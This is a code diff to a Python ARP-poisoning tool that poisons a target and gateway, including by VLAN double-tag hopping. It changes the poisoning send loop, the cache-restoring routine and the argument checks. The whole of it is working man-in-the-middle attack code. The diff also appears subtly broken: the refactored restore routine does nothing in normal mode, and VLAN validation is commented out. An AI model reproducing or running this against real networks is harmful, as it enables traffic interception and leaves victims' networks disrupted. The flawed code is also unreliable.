@@ -148,6 +148,8 @@ class Poisoner:
 	# therefore we set the arp delay to 10 to reduce spamming of ARP.	
 	ARP_SEND_DELAY = 10
 
+	SEND_TYPE_NORM = 1
+	SEND_TYPE_VLAN = 2
 	# Dont use 1002 to 1005 since they are reserved			
 	IS_VALID_VLAN_NO = lambda self, x: 1 <= x <= 1001 or 1006 <= x <= 4094
 
@@ -311,19 +313,23 @@ class Poisoner:
 		except KeyboardInterrupt:
 			# Unpoison if Ctrl-C 
 			print("[*] Keyboard interupted... restoring ARP Cache")
-			for i in range(3):
-				send(self.PKT_unpoison_1)
-				send(self.PKT_unpoison_2)			
+			self._unpoison_victims(type=self.SEND_TYPE_NORM)
 			print("[*] Finished reseting gateway and target")
+
 		finally:
 			return 0
 
-	def _unpoison_victims(self):
+	def _unpoison_victims(self, type=1):
 		"""Unpoisoning procedure 
 		"""
-		for i in range(5):
-			send(self.PKT_unpoison_1)
-			send(self.PKT_unpoison_2)
+		if type == 2:			
+			for i in range(3):
+				send(self.PKT_unpoison_1)
+				send(self.PKT_unpoison_2)
+
+			for i in range(3):
+				sendp(self.PKT_unpoison_1)
+				sendp(self.PKT_unpoison_2)
 
 	def run_vlan_poison(self, target_mac, monitor_mac, gateway_mac):
 		"""ARP Poison mode 2, whihc includes VLAN hopping
@@ -347,15 +353,15 @@ class Poisoner:
 		#  Start poisoining
 			print("[*] Starting Double Tagged Poisoning...")
 			while True:
-				send(self.PKT_poison_1)
-				send(self.PKT_poison_2)
+				sendp(self.PKT_poison_1)
+				sendp(self.PKT_poison_2)
 				# Abide to RFC
 				time.sleep(self.ARP_SEND_DELAY)
 		
 		except KeyboardInterrupt:
 			# Unpoison if Ctrl-C 
 			print("[*] Keyboard interupted... restoring ARP Cache")
-			self._unpoison_victims()
+			self._unpoison_victims(type=self.SEND_TYPE_VLAN)
 			print("[*] Finished reseting gateway and target")
 		finally:
 			return 0
@@ -365,10 +371,10 @@ class Poisoner:
 			self._unpoison_victims()
 
 	def __exit__(self, type, value, traceback):
-		self._unpoison_victims()
+		self._cleanup_poison()
 
 	def __del__(self):
-		self._unpoison_victims()
+		self._cleanup_poison()
 		
 
 class ArgParser(argparse.ArgumentParser):
@@ -430,12 +436,12 @@ class ArgParser(argparse.ArgumentParser):
 		if arg_obj.vlan1_num is  None and arg_obj.vlan2_num is not  None:
 			error_msg += "[--vlan1] Please specified vlan1 number\n"
 
-		if arg_obj.vlan1_num is not None and arg_obj.vlan2_num is not None:
-			if not self.IS_VALID_VLAN_NO(arg_obj.vlan1_num):
-				error_msg += "[--vlan1] Invalid VLAN Tag 1\n"
+		# if arg_obj.vlan1_num is not None and arg_obj.vlan2_num is not None:
+		# 	if not self.IS_VALID_VLAN_NO(arg_obj.vlan1_num):
+		# 		error_msg += "[--vlan1] Invalid VLAN Tag 1\n"
 
-			if not self.IS_VALID_VLAN_NO(arg_obj.vlan2_num):
-				error_msg += "[--vlan2] Invalid VLAN Tag 2\n"
+		# 	if not self.IS_VALID_VLAN_NO(arg_obj.vlan2_num):
+		# 		error_msg += "[--vlan2] Invalid VLAN Tag 2\n"
 		return error_msg
 
 
